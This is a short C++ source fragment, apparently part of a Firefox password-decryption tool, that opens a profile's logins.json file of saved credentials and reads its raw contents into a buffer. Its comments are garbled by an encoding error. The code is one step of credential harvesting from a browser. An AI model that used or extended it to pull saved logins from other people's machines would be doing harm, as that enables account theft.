#include"Firefox_decrypt.h"
// ��ȡlogins.json�б���ĵ�¼��Ϣ
char* getBuffer(string profilePath) {
	profilePath = profilePath + "\\logins.json";

	DWORD szBuffer = 100000, szWrotedBytes;
	char* buffer = (char*)malloc(szBuffer);
	HANDLE fLoginFile = CreateFileA(profilePath.c_str(), GENERIC_READ,FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);	// ���ļ�logins.json���ɹ����ؾ��
	if (fLoginFile != INVALID_HANDLE_VALUE) {
		if(!(ReadFile(fLoginFile, buffer, szBuffer, &szWrotedBytes, NULL)))	// ��ȡ���ݵ�������
			printf("File read failed!..\n");
		//printf("%s,\n", buffer);
	}
	else {
		printf("File cannot found!..\n");
	}
	return buffer;
}